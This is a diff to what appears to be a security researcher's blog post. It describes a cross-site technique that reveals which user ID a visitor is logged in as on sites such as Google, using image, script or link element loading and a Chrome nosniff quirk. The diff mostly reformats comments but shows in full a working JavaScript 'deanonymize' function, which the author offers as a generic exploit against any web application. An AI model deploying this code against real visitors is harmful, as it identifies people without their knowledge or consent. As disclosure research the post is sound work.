@@ -54,17 +54,17 @@ What happens if we simply use an endpoint that points to a non-existent resource
 Oops! ...works like a charm (as of now, they fixed this by disallowing redirections on `GET` requests altogether) but with one little problem, Google makes use of the "`X-Content-Type-Options: nosniff`" header which tells a browser not to do content type sniffing, disallowing embedding resources that don't return the right MIME type. Luckily, Firefox [doesn't seem to respect that header](https://bugzilla.mozilla.org/show_bug.cgi?id=471020) while working with script elements, but Chrome does respect it! Well, not exactly! It turns out that Chrome doesn't respect it while working with external stylesheets and proceeds to interpret the resource anyway:
 <br /><a href="/images/ChConsole.png" target="_blank"><img class="innerImg" src="/images/ChConsole-thumb.png" alt="Chrome console"></a><br />
 So, all we have to do is use a link element instead of a script element when running on Chrome. Fair enough, here's one single generic exploit that combines all of these tricks together to deanonymize whoever you want, on whichever browser he uses, against whatever webapp you please:
-<div style="font-size: 75%">
 
+<div id="long-snippet">
 {% highlight javascript linenos %}
-/\*\*
- \* Deanonymize a predefined group of users, given sufficient arguments.
- \* @param attackMethod {string}, the method of the attack (either 'redirection' or 'statusCode').
- \* @param endpoint {string}, the vulnerable endpoint with the user ID parameter last.
- \* @param idList {array}, a list of the targeted users' IDs.
- \* @param callback {function}, a callback function to pass all results to.
- \* @return {array}, an ordered output array with boolean values.
- \*/
+/**
+ * Deanonymize a predefined group of users, given sufficient arguments.
+ * @param attackMethod {string}, the method of the attack (either 'redirection' or 'statusCode').
+ * @param endpoint {string}, the vulnerable endpoint with the user ID parameter last.
+ * @param idList {array}, a list of the targeted users' IDs.
+ * @param callback {function}, a callback function to pass all results to.
+ * @return {array}, an ordered output array with boolean values.
+ */
 function deanonymize(attackMethod, endpoint, idList, callback) {
     var elNodes, testFn;
     var output = [];
@@ -76,11 +76,11 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
                 this.attachEvent('on' + evName, callback);
             };
     }());
-    /\*\*
-     \* Create new DOM elements.
-     \* @param tagName {string}, elements' tag name.
-     \* @return {array}, an array of DOM nodes.
-     \*/
+    /**
+     * Create new DOM elements.
+     * @param tagName {string}, elements' tag name.
+     * @return {array}, an array of DOM nodes.
+     */
     var createElements = function(tagName) {
         var i, l, el;
         var elNodes = [];
@@ -102,11 +102,11 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
         }
         return elNodes;
     };
-    /\*\*
-     \* Conduct tests in regard to a given function.
-     \* @param testFn {function}, a test function.
-     \* @return void.
-     \*/
+    /**
+     * Conduct tests in regard to a given function.
+     * @param testFn {function}, a test function.
+     * @return void.
+     */
     var assess = function(testFn) {
         var i, l;
         for (i = 0, l = elNodes.length; i < l; i++) {
@@ -120,11 +120,11 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
     };
     if (attackMethod === 'redirection') {
         elNodes = createElements('img');
-        /\*\*
-         \* Test if an image node was loaded or not.
-         \* @param imageNode {object}, a DOM image node.
-         \* @return {boolean}.
-         \*/
+        /**
+         * Test if an image node was loaded or not.
+         * @param imageNode {object}, a DOM image node.
+         * @return {boolean}.
+         */
         testFn = function(imgNode) {
             if (imgNode.naturalHeight !== 0 && imgNode.naturalWidth !== 0) {
                 return true;
@@ -134,11 +134,11 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
     } else if(attackMethod === 'statusCode') {
         elNodes = (/chrome/i.test(navigator.userAgent)) ? createElements('link') :
                            createElements('script');
-        /\*\*
-         \* Test if a given element is a child of `documentElement` or not.
-         \* @param el {object}, a DOM element.
-         \* @return {boolean}.
-         \*/
+        /**
+         * Test if a given element is a child of `documentElement` or not.
+         * @param el {object}, a DOM element.
+         * @return {boolean}.
+         */
         testFn = function(el) {
             if (el.parentNode !== document.documentElement) {
                 return true;
@@ -149,7 +149,6 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
     addListener.call(window, 'load', function() { assess(testFn); });
 }
 {% endhighlight %}
-
 </div>
 
 The story doesn't end here either, these issues are too widespread than you can imagine! I'm talking about Facebook, Twitter and the list goes on! Here's a couple of variations, just to mention a few:
